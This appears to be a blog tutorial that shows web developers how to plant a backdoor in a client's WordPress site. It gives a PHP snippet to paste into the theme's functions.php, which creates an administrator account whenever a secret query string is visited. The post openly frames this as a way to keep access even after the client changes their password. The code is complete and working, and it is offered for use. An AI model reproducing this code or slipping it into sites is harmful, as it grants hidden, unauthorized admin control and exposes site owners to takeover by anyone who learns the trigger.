If you are in the business of creating websites for others, this trick might come in handy. Even if they change their password after completing the website, you can still create your impact within minutes.

It also happens where a customer has no idea how to log in, and no longer has any contact with the previous developer so they do not know how to get in. Trying to get the login information from an old developer can sometimes be tricky and take a while if they even respond.
Adding a backdoor entry to a WordPress site
Step1:

Open the functions.php file located in your current theme’s folder. This is where we will place the code.

P.s. The recommended method is to put this in your child theme’s functions.php file – This will prevent it from being overwritten when there are theme updates.
Step2:

Copy the following code and paste it at the end of the file:

<?php
add_action('wp_head', 'wploop_backdoor'); 

function wploop_backdoor() { 
  If ($_GET['entryhook'] == 'knockknock') { 
     require('wp-includes/registration.php'); 
     If (!username_exists('username')) { 
        $user_id = wp_create_user('name', 'pass'); 
        $user = new WP_User($user_id);
        $user->set_role('administrator');
     }
  }
}
?>

Step3:

Once you have made your changes, save the file and leave it until you need it.

Leaving the code as is, all you will need to do is create a new administrator on your site. You can do this by visiting https://yoursite.com/?entryhook=knockknock.

After the page has loaded, type in your new username in "name" and the password in "pass."

If you want to make this change in the code, you can just change the 'name' and 'password' to whatever you want. Additionally, you can make changes to your back door link by changing either or both 'knockknock' or 'entryhook'.
